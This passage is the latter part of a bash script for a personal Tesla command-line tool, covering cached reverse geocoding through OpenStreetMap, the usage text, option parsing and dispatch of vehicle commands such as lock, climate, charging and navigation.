  key=$(awk -v a="$lat" -v b="$lon" 'BEGIN { printf "%.4f_%.4f", a, b }')
  path="$CACHE_DIR/places/$key.json"

  if place_cache_usable "$path"; then cat "$path"; return 0; fi

  [ -f "$PLACE_JQ" ] || fail_json "no address" "place.jq is missing next to bin/tesla"

  response=$(curl -sS -f -m 20 -A "$MAP_UA" \
    "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&lat=$lat&lon=$lon" 2>/dev/null) \
    || fail_json "no address"

  formatted=$(printf '%s' "$response" | jq -c -f "$PLACE_JQ") || fail_json "no address"
  [ -n "$formatted" ] || fail_json "no address"
  printf '%s' "$formatted" | write_private "$path"
  cat "$path"
}

# ------------------------------------------------------------------- options

usage() {
  cat <<'EOF'
tesla: read your Teslas, without keeping them awake.

  token                     paste a refresh token from a token app. The easy way
  login                     sign in through the browser instead. Needs devtools
  logout                    forget the tokens on this machine
  state                     online / asleep / offline. Free; never wakes the car
  car [--force]             everything the panel shows, subject to the sleep policy
  wake                      wake a sleeping car. The only call that does
  map LAT LON ZOOM W H      map tiles around a point, fetched and cached
  place LAT LON             that point as a street and a town

Commands. Each one wakes the car first, because a command is answered by the
car itself and a sleeping car cannot hear one:

  lock                      lock the doors
  unlock                    unlock the doors
  trunk                     open the boot (and close it, on an S or an X)
  frunk                     open the frunk
  windows vent|close        vent or close all four. Closing needs the car nearby
  sentry on|off             sentry mode
  valet on|off [PIN]        valet mode. The PIN sets one; leaving it off is fine
  drive                     keyless driving, for the next two minutes
  climate on|off            climate control
  temp DEGREES[C|F]         cabin setpoint. Bare number means the car's own unit
  defrost on|off            max defrost
  keeper off|keep|dog|camp  what the car does about the cabin while you are gone
  seat SEAT 0-3             seat heater. front-left, front-right, rear-left,
                            rear-center, rear-right
  wheel on|off              steering wheel heater
  charge start|stop         charging
  port open|close           the charge port door
  limit PERCENT             charge limit, 50-100
  amps AMPS                 charging current
  horn                      honk
  flash                     flash the lights
  homelink                  the garage door the car is parked in front of
  nav DESTINATION           send somewhere to the car's navigation

A reading in ~/.config/omarchy-tesla/fixture.json overrides `state` and `car`
entirely, for working on the panel without the car moving under you. Delete the
file to go back to the real car.

Options:
  --vin VIN                 pick a car, when the account has more than one
  --park-throttle SECONDS   how long a parked car is left alone (default 900)
  --tile-url URL            {z}/{x}/{y} template for map tiles
EOF
}

while [ $# -gt 0 ]; do
  case "$1" in
    --vin) VIN="${2-}"; shift 2 ;;
    --park-throttle) PARK_THROTTLE="${2-}"; shift 2 ;;
    --tile-url) TILE_URL="${2-}"; shift 2 ;;
    --force) FORCE=1; shift ;;
    -h|--help) usage; exit 0 ;;
    --) shift; break ;;
    -*) die "unknown option $1" ;;
    *) break ;;
  esac
done

[ $# -gt 0 ] || { usage; exit 1; }

command="$1"; shift

# Options are read again after the command, because `car --force` is how
# anybody would write it and the loop above stops at the first word that is not
# an option. Read only once, `--force` arrived as an argument to `car`, which
# ignored it, so the panel's Refresh button quietly did not force anything.
rest=()
while [ $# -gt 0 ]; do
  case "$1" in
    --force) FORCE=1; shift ;;
    *) rest+=("$1"); shift ;;
  esac
done
set -- ${rest[@]+"${rest[@]}"}

case "$command" in
  token)  cmd_token ;;
  login)  cmd_login ;;
  logout) cmd_logout ;;
  state)  cmd_state ;;
  car)    cmd_car ;;
  wake)   cmd_wake ;;
  map)    [ $# -eq 5 ] || die "map wants LAT LON ZOOM WIDTH HEIGHT"; cmd_map "$@" ;;
  place)  [ $# -eq 2 ] || die "place wants LAT LON"; cmd_place "$@" ;;

  # Everything from here on wakes the car and changes something about it.
  lock)     cmd_lock ;;
  unlock)   cmd_unlock ;;
  trunk)    cmd_trunk ;;
  frunk)    cmd_frunk ;;
  windows)  cmd_windows "$@" ;;
  sentry)   cmd_sentry "$@" ;;
  valet)    cmd_valet "$@" ;;
  drive)    cmd_drive ;;
  climate)  cmd_climate "$@" ;;
  temp)     cmd_temp "$@" ;;
  defrost)  cmd_defrost "$@" ;;
  keeper)   cmd_keeper "$@" ;;
  seat)     cmd_seat "$@" ;;
  wheel)    cmd_wheel "$@" ;;
  charge)   cmd_charge "$@" ;;
  port)     cmd_port "$@" ;;
  limit)    cmd_limit "$@" ;;
  amps)     cmd_amps "$@" ;;
  horn)     cmd_horn ;;
  flash)    cmd_flash ;;
  homelink) cmd_homelink ;;
  nav)      cmd_nav "$@" ;;

  # The signed protocol's own housekeeping.
  enroll|enrol) cmd_enroll ;;
  keys)     cmd_keys ;;

  *)      die "unknown command $command" ;;
esac
